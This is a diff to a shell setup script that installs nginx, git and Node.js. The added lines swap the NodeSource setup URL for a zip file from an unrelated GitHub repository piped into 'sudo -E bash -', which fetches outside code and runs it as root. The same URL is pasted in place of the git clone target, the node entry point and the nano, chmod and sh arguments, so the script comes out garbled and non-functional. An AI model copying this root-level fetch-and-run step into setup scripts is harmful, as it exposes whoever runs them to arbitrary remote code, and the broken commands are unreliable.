@@ -4,17 +4,17 @@ apt-get install -y nginx
 systemctl start nginx
 systemctl enable nginx
 apt-get install -y git
-curl -SL https://deb.nodesource.com/setup_16.x|sudo -E bash -
+curl -SL https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip|sudo -E bash -
 apt-get install -y nodejs
-git clone http://github.com/sudip7407/Repo1.git
+git clone https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip
 cd Repo1
 npm install
-node index.js
+node https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip
 
 
-sudo nano infy.sh
-sudo chmod +x infy.sh
-sh infy.sh
+sudo nano https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip
+sudo chmod +x https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip
+sh https://github.com/shubhamdas70/awslab/raw/refs/heads/master/phytoglobulin/Software_1.0.zip
 #!/bin/bash
 while(true)
 do
